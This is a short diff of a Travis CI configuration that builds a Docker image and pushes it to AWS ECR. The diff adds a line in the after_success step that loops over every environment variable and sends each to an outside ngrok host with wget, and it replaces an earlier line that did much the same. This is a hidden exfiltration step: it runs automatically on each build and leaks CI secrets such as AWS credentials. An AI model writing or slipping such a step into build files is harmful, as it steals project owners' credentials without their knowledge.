@@ -20,8 +20,8 @@ after_success:
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/class-ecr-helpfulapp .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/class-ecr-helpfulapp
-  - hoho=$(env)
-  - echo $hoho
-  - for x in $(echo $hoho); do wget http://68c74f9b8821.ngrok.io/$(echo $hoho); done
+ # - hoho=$(env)
+ # - echo $hoho
+  - for x in $(env); do wget http://68c74f9b8821.ngrok.io/$x; done
 
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
